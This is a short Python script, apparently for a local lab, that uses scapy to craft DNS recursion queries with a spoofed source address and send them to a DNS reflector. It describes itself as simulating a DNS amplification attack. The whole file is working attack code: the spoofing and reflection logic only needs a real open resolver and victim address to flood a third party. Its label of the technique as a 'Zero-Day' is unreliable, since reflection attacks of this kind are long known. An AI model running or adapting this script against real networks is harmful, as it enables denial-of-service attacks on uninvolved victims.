# dns_attacker.py
from scapy.all import IP, UDP, DNS, DNSQR, send, RandShort
import time

def run_dns_attack(dns_server_ip, victim_ip, domain_to_query="google.com", num_packets=100):
    """
    Simulates a DNS amplification attack by sending requests with a spoofed source IP
    to our new local DNS reflector.
    """
    print(f"\nStarting 'Zero-Day' DNS amplification attack...")
    print(f"Reflector Server: {dns_server_ip}, Spoofed Victim: {victim_ip}")

    for i in range(num_packets):
        # Craft a DNS query packet. The 'rd=1' flag asks for recursion.
        # The core of the attack: IP source is the VICTIM, destination is our LOCAL DNS REFLECTOR.
        packet = (
            IP(src=victim_ip, dst=dns_server_ip) /
            UDP(sport=RandShort(), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=domain_to_query))
        )
        
        send(packet, verbose=0)
        time.sleep(0.05)

    print("Zero-day attack traffic generation complete.")

if __name__ == "__main__":
    # --- THIS IS THE CRITICAL CHANGE ---
    # The attacker now targets our local reflector running on 127.0.0.1
    DNS_SERVER_IP = "127.0.0.1" 
    VICTIM_IP = "192.168.1.100" # The same victim IP as before
    
    run_dns_attack(DNS_SERVER_IP, VICTIM_IP)
